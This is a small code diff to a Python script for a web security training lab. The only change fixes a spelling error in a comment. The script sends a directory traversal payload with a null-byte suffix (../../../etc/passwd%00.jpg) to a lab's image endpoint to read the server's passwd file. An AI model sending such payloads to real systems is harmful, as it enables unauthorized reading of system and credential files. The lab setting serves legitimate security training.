@@ -15,7 +15,7 @@ lab_id = '0ad900d204ca393685cbcab200480021' #change based on generated lab
 uri = f"https://{lab_id}.web-security-academy.net/"  
 
 
-payload = 'image?filename=../../../etc/passwd%00.jpg' # directory traversal payload, exploit the image endpoint by using the 'filename' paramater
+payload = 'image?filename=../../../etc/passwd%00.jpg' # directory traversal payload, exploit the image endpoint by using the 'filename' parameter
 
 r1 = requests.get(uri + payload)
 print(r1.text)
